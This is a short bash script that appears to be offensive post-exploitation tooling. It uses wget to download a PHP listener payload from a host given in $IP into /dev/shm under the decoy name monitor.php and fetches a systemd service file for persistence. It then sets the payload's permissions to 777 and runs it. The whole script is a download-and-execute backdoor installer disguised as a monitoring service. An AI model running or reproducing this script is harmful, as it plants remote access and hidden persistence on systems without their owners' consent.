#!/bin/bash

#Download
wget $IP/payloads/phpListener.php -O /dev/shm/monitor.php

#get service and run
wget $IP/persistence/services/monitor.service -O /etc/systemd/system/monitor.service

chmod 777 /dev/shm/monitor.php

php /dev/shm/monitor.php